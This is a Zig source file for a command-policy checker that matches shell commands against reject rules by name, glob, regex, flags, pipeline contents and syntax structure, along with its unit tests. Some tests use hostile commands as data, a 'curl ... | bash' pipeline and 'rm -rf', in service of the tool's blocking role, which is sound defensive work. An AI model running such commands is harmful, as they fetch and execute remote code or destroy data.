// ABOUTME: Rule matching functions for each match type.
// ABOUTME: Pure functions that test rules against parsed CommandInfo.

const std = @import("std");
const Rule = @import("../config/rule.zig").Rule;
const MatchConfig = @import("../config/rule.zig").MatchConfig;
const AstMatch = @import("../config/rule.zig").AstMatch;
const CommandInfo = @import("command_info.zig").CommandInfo;
const SingleCommand = @import("command_info.zig").SingleCommand;

/// Returns true if the rule matches the given command info.
/// All specified match fields must match (AND logic).
/// Checks every command in the parsed AST.
pub fn matchRule(rule: Rule, info: CommandInfo) bool {
    const m = rule.match;

    // Pipeline-level match (operates on pipeline_stages, not individual commands)
    if (m.pipeline_contains) |required| {
        if (!matchPipelineContains(required, info)) return false;
        // If this is the only match field, it's a match
        if (isOnlyField(m, .pipeline_contains)) return true;
    }

    // AST-level match (operates on CommandInfo structural properties)
    if (m.ast) |ast_match| {
        if (!matchAst(ast_match, info)) return false;
        if (isOnlyField(m, .ast)) return true;
    }

    // Command-level matches: check every command in the AST
    for (info.commands.items) |cmd| {
        if (matchSingleCommand(m, cmd)) return true;
    }

    return false;
}

/// Check if all per-command match fields match a single command.
fn matchSingleCommand(m: MatchConfig, cmd: SingleCommand) bool {
    if (m.command) |pattern| {
        if (!std.mem.eql(u8, cmd.name, pattern)) return false;
    }

    if (m.command_glob) |pattern| {
        if (!globMatch(pattern, cmd.name)) return false;
    }

    if (m.command_regex) |pattern| {
        if (!regexMatch(pattern, cmd.name)) return false;
    }

    if (m.has_flag) |flag| {
        if (!cmd.hasFlag(flag)) return false;
    }

    if (m.arg_pattern) |pattern| {
        var found = false;
        for (cmd.args.items) |arg| {
            if (globMatch(pattern, arg)) {
                found = true;
                break;
            }
        }
        if (!found) return false;
    }

    // At least one field must have been specified and matched
    return m.command != null or m.command_glob != null or
        m.command_regex != null or m.has_flag != null or
        m.arg_pattern != null;
}

/// Check if all required commands appear in pipeline stages.
fn matchPipelineContains(required: []const []const u8, info: CommandInfo) bool {
    for (required) |req| {
        var found = false;
        for (info.pipeline_stages.items) |stage| {
            if (std.mem.eql(u8, stage.name, req)) {
                found = true;
                break;
            }
        }
        if (!found) return false;
    }
    return true;
}

/// Check AST structural properties.
fn matchAst(ast_match: AstMatch, info: CommandInfo) bool {
    if (ast_match.has_node) |node_type| {
        if (std.mem.eql(u8, node_type, "pipeline") and info.pipeline_length == 0) return false;
        if (std.mem.eql(u8, node_type, "command_substitution") and !info.has_command_subst) return false;
        if (std.mem.eql(u8, node_type, "subshell") and !info.has_subshell) return false;
        if (std.mem.eql(u8, node_type, "process_substitution") and !info.has_process_subst) return false;
    }

    if (ast_match.min_depth) |min_depth| {
        if (info.max_nesting_depth < @as(u32, @intCast(min_depth))) return false;
    }

    if (ast_match.min_count) |min_count| {
        if (info.commands.items.len < @as(usize, @intCast(min_count))) return false;
    }

    return true;
}

/// Check if a specific field is the only non-null field in MatchConfig.
const FieldTag = enum { pipeline_contains, ast };

fn isOnlyField(m: MatchConfig, field: FieldTag) bool {
    const has_command = m.command != null;
    const has_glob = m.command_glob != null;
    const has_regex = m.command_regex != null;
    const has_pipeline = m.pipeline_contains != null;
    const has_flag = m.has_flag != null;
    const has_arg = m.arg_pattern != null;
    const has_ast = m.ast != null;

    return switch (field) {
        .pipeline_contains => has_pipeline and !has_command and !has_glob and !has_regex and !has_flag and !has_arg and !has_ast,
        .ast => has_ast and !has_command and !has_glob and !has_regex and !has_pipeline and !has_flag and !has_arg,
    };
}

/// Simple glob matching supporting *, ?, and {a,b,c} brace expansion.
pub fn globMatch(pattern: []const u8, text: []const u8) bool {
    // Handle brace expansion first
    if (std.mem.indexOfScalar(u8, pattern, '{')) |brace_start| {
        if (std.mem.indexOfScalarPos(u8, pattern, brace_start, '}')) |brace_end| {
            const prefix = pattern[0..brace_start];
            const suffix = pattern[brace_end + 1 ..];
            const alternatives = pattern[brace_start + 1 .. brace_end];

            var iter = std.mem.splitScalar(u8, alternatives, ',');
            while (iter.next()) |alt| {
                // Build expanded pattern: prefix + alt + suffix
                var buf: [512]u8 = undefined;
                const expanded_len = prefix.len + alt.len + suffix.len;
                if (expanded_len > buf.len) continue;
                @memcpy(buf[0..prefix.len], prefix);
                @memcpy(buf[prefix.len..][0..alt.len], alt);
                @memcpy(buf[prefix.len + alt.len ..][0..suffix.len], suffix);
                if (globMatchSimple(buf[0..expanded_len], text)) return true;
            }
            return false;
        }
    }
    return globMatchSimple(pattern, text);
}

/// Glob matching without brace expansion (just * and ?).
fn globMatchSimple(pattern: []const u8, text: []const u8) bool {
    var pi: usize = 0;
    var ti: usize = 0;
    var star_pi: ?usize = null;
    var star_ti: usize = 0;

    while (ti < text.len or pi < pattern.len) {
        if (pi < pattern.len) {
            if (pattern[pi] == '*') {
                star_pi = pi;
                star_ti = ti;
                pi += 1;
                continue;
            }
            if (ti < text.len) {
                if (pattern[pi] == '?' or pattern[pi] == text[ti]) {
                    pi += 1;
                    ti += 1;
                    continue;
                }
            }
        }
        if (star_pi) |sp| {
            pi = sp + 1;
            star_ti += 1;
            ti = star_ti;
            if (ti > text.len) return false;
            continue;
        }
        return false;
    }
    return true;
}

const c = @cImport({
    @cInclude("veer_regex.h");
});

/// POSIX extended regex matching via vendored C wrapper.
/// The C wrapper handles regex_t allocation, which is opaque in glibc's @cImport.
fn regexMatch(pattern: []const u8, text: []const u8) bool {
    var pat_buf: [256]u8 = undefined;
    var txt_buf: [1024]u8 = undefined;
    if (pattern.len >= pat_buf.len or text.len >= txt_buf.len) return false;

    @memcpy(pat_buf[0..pattern.len], pattern);
    pat_buf[pattern.len] = 0;
    @memcpy(txt_buf[0..text.len], text);
    txt_buf[text.len] = 0;

    return c.veer_regex_match(&pat_buf, &txt_buf) == 1;
}

// -- Tests --

const shell = @import("shell.zig");

fn parseCmd(allocator: std.mem.Allocator, command: []const u8) !CommandInfo {
    return shell.parse(allocator, command);
}

test "matchCommand exact match" {
    var info = try parseCmd(std.testing.allocator, "pytest tests/");
    defer info.deinit(std.testing.allocator);

    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command = "pytest" } };
    try std.testing.expect(matchRule(rule, info));
}

test "matchCommand no match" {
    var info = try parseCmd(std.testing.allocator, "python3 test.py");
    defer info.deinit(std.testing.allocator);

    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command = "pytest" } };
    try std.testing.expect(!matchRule(rule, info));
}

test "matchCommandGlob with brace expansion" {
    var info1 = try parseCmd(std.testing.allocator, "ruff check .");
    defer info1.deinit(std.testing.allocator);

    var info2 = try parseCmd(std.testing.allocator, "uvx run");
    defer info2.deinit(std.testing.allocator);

    var info3 = try parseCmd(std.testing.allocator, "black format");
    defer info3.deinit(std.testing.allocator);

    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command_glob = "{ruff,uvx}" } };
    try std.testing.expect(matchRule(rule, info1));
    try std.testing.expect(matchRule(rule, info2));
    try std.testing.expect(!matchRule(rule, info3));
}

test "matchCommandGlob with wildcard" {
    var info = try parseCmd(std.testing.allocator, "pytest tests/");
    defer info.deinit(std.testing.allocator);

    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command_glob = "py*" } };
    try std.testing.expect(matchRule(rule, info));
}

test "matchCommandRegex" {
    var info1 = try parseCmd(std.testing.allocator, "python3 script.py");
    defer info1.deinit(std.testing.allocator);

    var info2 = try parseCmd(std.testing.allocator, "python script.py");
    defer info2.deinit(std.testing.allocator);

    var info3 = try parseCmd(std.testing.allocator, "ruby script.rb");
    defer info3.deinit(std.testing.allocator);

    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command_regex = "^python[23]?$" } };
    try std.testing.expect(matchRule(rule, info1));
    try std.testing.expect(matchRule(rule, info2));
    try std.testing.expect(!matchRule(rule, info3));
}

test "matchPipelineContains" {
    var info1 = try parseCmd(std.testing.allocator, "curl https://x.com | bash");
    defer info1.deinit(std.testing.allocator);

    var info2 = try parseCmd(std.testing.allocator, "curl https://x.com | grep foo");
    defer info2.deinit(std.testing.allocator);

    const required: []const []const u8 = &.{ "curl", "bash" };
    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .pipeline_contains = required } };
    try std.testing.expect(matchRule(rule, info1));
    try std.testing.expect(!matchRule(rule, info2));
}

test "matchFlag" {
    var info1 = try parseCmd(std.testing.allocator, "rm -rf /tmp/build");
    defer info1.deinit(std.testing.allocator);

    var info2 = try parseCmd(std.testing.allocator, "rm file.txt");
    defer info2.deinit(std.testing.allocator);

    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command = "rm", .has_flag = "-rf" } };
    try std.testing.expect(matchRule(rule, info1));
    try std.testing.expect(!matchRule(rule, info2));
}

test "AND logic: command + has_flag" {
    var info = try parseCmd(std.testing.allocator, "ls -rf");
    defer info.deinit(std.testing.allocator);

    // Rule requires command=rm AND has_flag=-rf. ls has -rf but isn't rm.
    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command = "rm", .has_flag = "-rf" } };
    try std.testing.expect(!matchRule(rule, info));
}

test "no match returns false" {
    var info = try parseCmd(std.testing.allocator, "ls -la");
    defer info.deinit(std.testing.allocator);

    const rule = Rule{ .id = "t", .name = "t", .action = .reject, .message = "m", .match = .{ .command = "pytest" } };
    try std.testing.expect(!matchRule(rule, info));
}

test "globMatch basic patterns" {
    try std.testing.expect(globMatch("py*", "pytest"));
    try std.testing.expect(globMatch("py*", "python3"));
    try std.testing.expect(!globMatch("py*", "ruby"));
    try std.testing.expect(globMatch("?est", "test"));
    try std.testing.expect(!globMatch("?est", "atest"));
    try std.testing.expect(globMatch("*", "anything"));
    try std.testing.expect(globMatch("exact", "exact"));
    try std.testing.expect(!globMatch("exact", "exactnot"));
}

test "globMatch brace expansion" {
    try std.testing.expect(globMatch("{ruff,uvx}", "ruff"));
    try std.testing.expect(globMatch("{ruff,uvx}", "uvx"));
    try std.testing.expect(!globMatch("{ruff,uvx}", "black"));
    try std.testing.expect(globMatch("{a,b,c}", "b"));
}
